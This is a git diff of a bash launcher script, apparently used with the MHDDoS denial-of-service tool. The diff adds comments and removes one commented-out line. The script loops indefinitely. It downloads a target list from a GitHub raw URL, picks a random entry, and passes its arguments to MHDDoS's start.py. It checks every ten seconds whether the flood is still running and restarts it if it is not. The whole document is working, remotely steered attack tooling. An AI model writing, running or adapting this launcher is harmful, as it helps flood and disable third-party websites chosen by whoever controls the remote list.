@@ -1,15 +1,20 @@
 #!/bin/bash
 
+## Check every 10 sec if MHDDos is terminated. It happens a lot for some reason. Relaunch process if terminated.
 while true
 do
+
+## get random site from list of sites
 site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_list | cat | shuf -n 1)
+
+##cut "command line" - everything before "#"
 cmd_line=$(echo $site | awk -F "#" '{print $1}')
 echo $cmd_line
 
+## check if MHDDoS running. If it's not yet running or was terminated launch it.
 if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
         echo $(date +%H":"%M)
         echo "process is not running"
-#       rm ~/MHDDoS/files/proxies/socks5.txt
         python3 ~/MHDDoS/start.py $cmd_line
 fi
 sleep 10
